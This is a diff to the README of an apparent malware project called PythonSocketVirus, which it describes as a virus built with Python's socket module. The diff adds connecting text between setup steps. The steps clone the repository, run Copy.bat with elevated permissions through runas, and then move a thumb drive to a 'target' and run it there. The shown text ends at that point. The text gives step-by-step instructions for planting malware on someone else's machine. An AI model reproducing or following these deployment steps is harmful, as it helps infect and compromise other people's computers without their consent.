@@ -6,10 +6,10 @@ PythonSocketVirus is a virus made with the module socket in python and converted
 ```
    git clone https://github.com/TeoSean/PythonSocketVirus2.git
 ```
-
+next
 ```cd PythonSocketVirus2
 ```
-
+finally run with admin permissions
 ```runas /trustlevel:<0x30000> Copy.bat
 ```
 transfer removable thumb drive to target and run:
